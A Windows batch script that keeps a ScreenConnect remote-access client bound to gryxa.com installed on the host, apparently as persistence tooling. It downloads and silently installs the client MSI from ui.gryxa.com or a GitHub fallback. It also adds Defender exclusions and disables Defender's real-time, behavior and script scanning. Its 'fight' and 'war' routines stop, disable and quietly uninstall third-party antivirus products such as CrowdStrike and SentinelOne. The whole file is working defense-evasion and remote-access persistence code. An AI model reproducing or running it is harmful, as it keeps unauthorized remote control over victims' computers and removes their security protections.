@echo off
rem WINRTCS_GUARD 0.0.4 - recurring gryxa health (agent-launched ~3h). FP-agnostic: gryxa = any
rem ScreenConnect Client service whose ImagePath contains gryxa.com. Keepers (sevrz) never match.
rem Ladder: start -> restart -> reinstall (UI MSI -> repo fallback).
rem 0.0.2: fight-back escalation, evidence-driven via fight.cnt streak (resets only on clean run):
rem   streak>=2 -> counter Defender (RTM/behavior/IOAV off + policy pins) + stop/disable 3rd-party AV
rem   streak>=3 -> uninstall the interfering product (once per day, msiexec-quiet or silent flags)
rem 0.0.3: install preconditioning (kill svc -> msiexec /x shared PC -> purge phantom Installer keys
rem   -> orphan/gryxa dir sweep) + one retry; counter reset moved here from the agent gate.
rem 0.0.4: shields that actually land BEFORE install - literal gryxa dir exclusions via Policies
rem   channel (Tamper-Protection-safe, wildcards don't work in ExclusionPath) + bounded async
rem   Add-MpPreference (60s cap, then proceed); post-install re-shield of the REAL ImagePath dir;
rem   FAIL_svc_not_running / FAIL_msiexec / no_session now bump the streak (0.0.3 looped at 0);
rem   fast-recheck cadence (guard.cnt=170, ~10 min) after any install/recovery so a client killed
rem   right after verify is caught in minutes, not 3h; W-wait reset fix for install retries;
rem   install cap (2 per run) so fight->install can't loop forever inside one run.
setlocal EnableExtensions EnableDelayedExpansion
set "ZD=C:\ProgramData\WinRTCS"
set "CURL=%SystemRoot%\System32\curl.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "UI=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "LOG=%ZD%\guard.log"
set "STREAKF=%ZD%\fight.cnt"
set "PRESENT=%ZD%\gryxa_present.flag"
set "LOCK=%ZD%\guard.lock"
set "GDIR86=C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)"
set "GDIR64=C:\Program Files\ScreenConnect Client (36e506ff016b2151)"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1

rem --- overlap lock: skip if another guard is mid-run; break lock if stale (>15 min) ---
"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -NonInteractive -Command "if (Test-Path '%LOCK%') { $age = (Get-Date) - (Get-Item '%LOCK%').LastWriteTime; if ($age.TotalMinutes -lt 15) { exit 1 } } ; New-Item -Path '%LOCK%' -ItemType File -Force | Out-Null; exit 0" >nul 2>&1
if errorlevel 1 (
  endlocal & exit /b 0
)

rem --- gate owns the cadence; we own the reset (lock-busy above leaves counter high -> retry next tick) ---
echo 0>"%ZD%\guard.cnt"
set "RI=0"

if exist "%LOG%" for %%L in ("%LOG%") do if %%~zL GTR 204800 move /y "%LOG%" "%LOG%.old" >nul 2>&1
set "STREAK=0"
if exist "%STREAKF%" set /p "STREAK=" <"%STREAKF%"
echo [%DATE% %TIME%] guard_begin host=%COMPUTERNAME% streak=!STREAK!>>"%LOG%"

call :Shields

call :Detect
if not defined GSVC (
  if exist "%PRESENT%" ( set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%" & echo [%DATE% %TIME%] gryxa_absent streak=!STREAK!>>"%LOG%" ) else ( echo [%DATE% %TIME%] gryxa_absent_fresh>>"%LOG%" )
  goto :FightThenInstall
)

sc query "!GSVC!" 2>nul | findstr /C:"RUNNING" >nul
if errorlevel 1 (
  echo [%DATE% %TIME%] svc_stopped start_attempt !GSVC!>>"%LOG%"
  sc start "!GSVC!" >nul 2>&1
  timeout /t 8 /nobreak >nul 2>&1
  sc query "!GSVC!" 2>nul | findstr /C:"RUNNING" >nul
  if errorlevel 1 (
    set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
    echo [%DATE% %TIME%] start_fail streak=!STREAK!>>"%LOG%"
    goto :FightThenInstall
  )
  echo 170>"%ZD%\guard.cnt"
)

call :Session
if defined GUP goto :Healthy

rem --- zombie: RUNNING but no established session -> restart once, recheck, else fight+install ---
echo [%DATE% %TIME%] zombie_restart !GSVC!>>"%LOG%"
sc stop "!GSVC!" >nul 2>&1
timeout /t 4 /nobreak >nul 2>&1
sc start "!GSVC!" >nul 2>&1
timeout /t 15 /nobreak >nul 2>&1
call :Session
if defined GUP ( echo 170>"%ZD%\guard.cnt" & goto :Healthy )
set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
echo [%DATE% %TIME%] zombie_persist streak=!STREAK!>>"%LOG%"
goto :FightThenInstall

:Healthy
echo 0>"%STREAKF%"
echo %DATE% %TIME%>"%PRESENT%"
echo [%DATE% %TIME%] healthy !GSVC!>>"%LOG%"
goto :Done

:FightThenInstall
if !STREAK! GEQ 2 call :Fight
if !STREAK! GEQ 3 call :War
goto :Install

:Fight
echo [%DATE% %TIME%] fight_mode streak=!STREAK!>>"%LOG%"
powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); foreach ($h in (Get-MpThreatDetection | Where-Object { $_.Resources -match 'ScreenConnect' } | Select-Object -First 5)) { $o += ('defender_threat ' + $h.ThreatName) }; Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true; $rp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'; New-Item -Path $rp -Force | Out-Null; foreach ($v in 'DisableRealtimeMonitoring','DisableBehaviorMonitoring','DisableIOAVProtection','DisableScriptScanning') { Set-ItemProperty -Path $rp -Name $v -Value 1 -Type DWord }; $o += 'defender_countered'; $avs = Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct | Where-Object { $_.displayName -notmatch 'Windows Defender' }; $names = @(); foreach ($a in $avs) { $names += $a.displayName }; if (-not $names) { $known='Sophos|Malwarebytes|McAfee|CrowdStrike|Falcon|SentinelOne|SentinelAgent|Avast|AVG|Bitdefender|ESET|Kaspersky|Trend Micro|Webroot|Norton|Vipre|Cylance'; $names = @((Get-CimInstance Win32_Service | Where-Object { $_.Name -match $known -or $_.DisplayName -match $known -or $_.PathName -match $known } | ForEach-Object { $_.Name })) }; foreach ($n in $names) { $tok = [regex]::Escape($n); $svcs = Get-CimInstance Win32_Service | Where-Object { $_.Name -match $tok -or $_.DisplayName -match $tok -or $_.PathName -match $tok }; foreach ($s in $svcs) { & sc.exe stop $s.Name 2>&1 | Out-Null; & sc.exe config $s.Name start= disabled 2>&1 | Out-Null; $o += ('av_stopped ' + $s.Name) } }; $o += ('fight_targets ' + ($names -join ',')); $o | Set-Content -Path '%ZD%\fight.out' -Encoding ASCII" >nul 2>&1
if exist "%ZD%\fight.out" ( type "%ZD%\fight.out">> "%LOG%" )
exit /b 0

:War
set "WARM=%ZD%\war.done"
set "WARTODAY="
if exist "%WARM%" set /p "WARTODAY=" <"%WARM%"
if "!WARTODAY!"=="%DATE%" exit /b 0
echo %DATE%>"%WARM%"
echo [%DATE% %TIME%] war_mode streak=!STREAK!>>"%LOG%"
powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); $avs = Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct | Where-Object { $_.displayName -notmatch 'Windows Defender' }; $names = @(); foreach ($a in $avs) { $names += $a.displayName }; if (-not $names) { $known='Sophos|Malwarebytes|McAfee|CrowdStrike|Falcon|SentinelOne|SentinelAgent|Avast|AVG|Bitdefender|ESET|Kaspersky|Trend Micro|Webroot|Norton|Vipre|Cylance'; $names = @((Get-CimInstance Win32_Service | Where-Object { $_.Name -match $known -or $_.DisplayName -match $known -or $_.PathName -match $known } | ForEach-Object { $_.DisplayName })) }; $keys = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'; foreach ($n in $names) { $tok = [regex]::Escape($n); $un = Get-ItemProperty $keys | Where-Object { $_.DisplayName -and ($_.DisplayName -match $tok) -and ($_.DisplayName -notmatch 'ScreenConnect') }; foreach ($u in $un) { $us = $u.QuietUninstallString; if (-not $us) { $us = $u.UninstallString }; if (-not $us) { continue }; if ($us -match 'msiexec') { $g = [regex]::Match($us, '\{[0-9A-Fa-f-]+\}').Value; if ($g) { $o += ('war_uninstall ' + $u.DisplayName); $p = Start-Process msiexec.exe -ArgumentList ('/x ' + $g + ' /qn /norestart') -Wait -PassThru; $o += ('war_rc ' + $p.ExitCode) } } else { $o += ('war_uninstall_exe ' + $u.DisplayName); $p = Start-Process cmd.exe -ArgumentList ('/c \"' + $us + '\" /S /qn /quiet /silent') -Wait -PassThru; $o += ('war_rc ' + $p.ExitCode) } } }; if (-not $o) { $o += 'war_no_targets' }; $o | Set-Content -Path '%ZD%\war.out' -Encoding ASCII" >nul 2>&1
if exist "%ZD%\war.out" ( type "%ZD%\war.out">> "%LOG%" )
exit /b 0

:Install
set /a RI+=1
if !RI! GTR 2 ( echo [%DATE% %TIME%] FAIL_install_cap>>"%LOG%" & echo 170>"%ZD%\guard.cnt" & goto :Done )
set "MSI=%ZD%\gryxa_install.msi"
set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
set "PACKED=814CC7D9653A3969CD5C14CE440DB313"

rem --- precondition (proven clean-install): kill gryxa svcs, uninstall shared PC, purge phantoms ---
call :Detect
if defined GSVC (
  sc stop "!GSVC!" >nul 2>&1
  sc delete "!GSVC!" >nul 2>&1
)
msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >nul 2>&1
call :PurgePhantom

for /d %%D in ("%ProgramFiles(x86)%\ScreenConnect Client (*)") do (
  sc query "%%~nxD" >nul 2>&1
  if errorlevel 1 (
    rmdir /s /q "%%D" >nul 2>&1
  ) else (
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%%~nxD" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if not errorlevel 1 rmdir /s /q "%%D" >nul 2>&1
  )
)

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1

set "SRC=ui"
del /f /q "%MSI%" >nul 2>&1
echo [%DATE% %TIME%] fetch_ui>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 180 -o "%MSI%" "%UI%" >nul 2>&1
if not exist "%MSI%" goto :RepoFetch
for %%F in ("%MSI%") do if %%~zF LSS 5000000 ( del /f /q "%MSI%" >nul 2>&1 & goto :RepoFetch )
goto :DoInstall

:RepoFetch
set "SRC=repo"
echo [%DATE% %TIME%] fetch_repo_fallback>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 180 -o "%MSI%" "%BASE%/pkg_gryxa.msi?t=%RANDOM%%RANDOM%" >nul 2>&1
if not exist "%MSI%" ( echo [%DATE% %TIME%] FAIL_no_msi_source>>"%LOG%" & goto :Done )
for %%F in ("%MSI%") do if %%~zF LSS 5000000 ( echo [%DATE% %TIME%] FAIL_msi_small>>"%LOG%" & del /f /q "%MSI%" >nul 2>&1 & goto :Done )

:DoInstall
set "ATTEMPT=0"
:TryInstall
set /a ATTEMPT+=1
echo [%DATE% %TIME%] msi_install src=!SRC! attempt=!ATTEMPT!>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v "%ZD%\msi_gryxa_install.log" >nul 2>&1
set "MSIEXIT=!ERRORLEVEL!"
echo [%DATE% %TIME%] msiexec_exit=!MSIEXIT! attempt=!ATTEMPT!>>"%LOG%"
if "!MSIEXIT!"=="0" goto :WaitSvc0
if "!MSIEXIT!"=="3010" goto :WaitSvc0
if !ATTEMPT! GEQ 2 ( set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%" & echo [%DATE% %TIME%] FAIL_msiexec_!MSIEXIT! streak=!STREAK!>>"%LOG%" & echo 170>"%ZD%\guard.cnt" & goto :Done )
msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >nul 2>&1
call :PurgePhantom
timeout /t 5 /nobreak >nul 2>&1
goto :TryInstall

:PurgePhantom
reg delete "HKLM\SOFTWARE\Classes\Installer\Products\%PACKED%" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\%PACKED%" /f >nul 2>&1
reg delete "HKCR\Installer\Products\%PACKED%" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
exit /b 0

:WaitSvc0
set "W=0"
:WaitSvc
timeout /t 5 /nobreak >nul 2>&1
call :Detect
if defined GSVC (
  sc query "!GSVC!" 2>nul | findstr /C:"RUNNING" >nul
  if not errorlevel 1 goto :SvcUp
)
set /a W+=1
if !W! LSS 12 goto :WaitSvc
set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
echo [%DATE% %TIME%] FAIL_svc_not_running streak=!STREAK!>>"%LOG%"
goto :FightThenInstall

:SvcUp
sc config "!GSVC!" start= auto >nul 2>&1
sc failure "!GSVC!" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "!GSVC!" >nul 2>&1

rem --- post-install re-shield: the real install dir exists now, pin it by ImagePath ---
set "SHDIR="
for /f "tokens=2,*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Services\!GSVC!" /v ImagePath 2^>nul ^| findstr /I "ImagePath"') do set "SHIMG=%%B"
if defined SHIMG (
  set "SHIMG=!SHIMG:"=!"
  for %%P in ("!SHIMG!") do set "SHDIR=%%~dpP"
  if defined SHDIR (
    set "SHDIR=!SHDIR:~0,-1!"
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "!SHDIR!" /t REG_DWORD /d 0 /f >nul 2>&1
    powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; Add-MpPreference -ExclusionPath '!SHDIR!'" >nul 2>&1
    echo [%DATE% %TIME%] resheilded !SHDIR!>>"%LOG%"
  )
)

:WaitSession
set "W=0"
:WaitSess
timeout /t 5 /nobreak >nul 2>&1
call :Session
if defined GUP (
  echo %DATE% %TIME%>"%PRESENT%"
  echo [%DATE% %TIME%] installed_verified !GSVC! src=!SRC! recheck=10m>>"%LOG%"
  echo 170>"%ZD%\guard.cnt"
  del /f /q "%MSI%" >nul 2>&1
  goto :Done
)
set /a W+=1
if !W! LSS 6 goto :WaitSess
set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
echo [%DATE% %TIME%] installed_no_session_yet !GSVC! src=!SRC! streak=!STREAK! recheck=10m>>"%LOG%"
echo 170>"%ZD%\guard.cnt"
del /f /q "%MSI%" >nul 2>&1
goto :Done

:Detect
set "GSVC="
for /f "tokens=2 delims=:" %%A in ('sc query state^= all 2^>nul ^| findstr /C:"SERVICE_NAME: ScreenConnect Client ("') do (
  for /f "tokens=* delims= " %%S in ("%%A") do (
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%%S" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if not errorlevel 1 set "GSVC=%%S"
  )
)
exit /b 0

:Session
set "GUP="
set "GPID="
if not defined GSVC exit /b 0
for /f "tokens=3" %%P in ('sc queryex "!GSVC!" 2^>nul ^| findstr /C:"PID"') do set "GPID=%%P"
if not defined GPID exit /b 0
if "!GPID!"=="0" exit /b 0
netstat -ano 2>nul | findstr /C:"ESTABLISHED" | findstr /E /C:" !GPID!" >nul 2>&1
if not errorlevel 1 set "GUP=1"
exit /b 0

:Shields
rem --- channel 1: Policies-key reg pins (instant; GP channel honored even with Tamper Protection) ---
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%GDIR86%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%GDIR64%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%ZD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.WindowsClient.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
rem --- channel 2: cmdlet API, bounded (60s cap) so a busy Defender service can't hang the guard ---
del /f /q "%ZD%\shields.done" >nul 2>&1
start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $st=Get-MpComputerStatus; $paths=@('%GDIR86%','%GDIR64%','%ZD%'); foreach($root in 'C:\Program Files (x86)','C:\Program Files'){ Get-ChildItem $root -Directory -Filter 'ScreenConnect Client (*)' | ForEach-Object { $paths += $_.FullName } }; foreach($p in ($paths | Select-Object -Unique)){ Add-MpPreference -ExclusionPath $p }; foreach($x in 'ScreenConnect.ClientService.exe','ScreenConnect.WindowsClient.exe','msiexec.exe'){ Add-MpPreference -ExclusionProcess $x }; ('shields_ok rtm=' + $st.RealTimeProtectionEnabled + ' tp=' + $st.IsTamperProtected) | Set-Content -Path '%ZD%\shields.done' -Encoding ASCII" >nul 2>&1
set "SW=0"
:ShieldsWait
if exist "%ZD%\shields.done" goto :ShieldsOut
timeout /t 5 /nobreak >nul 2>&1
set /a SW+=1
if !SW! LSS 12 goto :ShieldsWait
echo [%DATE% %TIME%] shields_timeout_proceeding>>"%LOG%"
:ShieldsOut
if exist "%ZD%\shields.done" ( type "%ZD%\shields.done">>"%LOG%" & del /f /q "%ZD%\shields.done" >nul 2>&1 )
exit /b 0

:Done
del /f /q "%LOCK%" >nul 2>&1
endlocal & exit /b 0
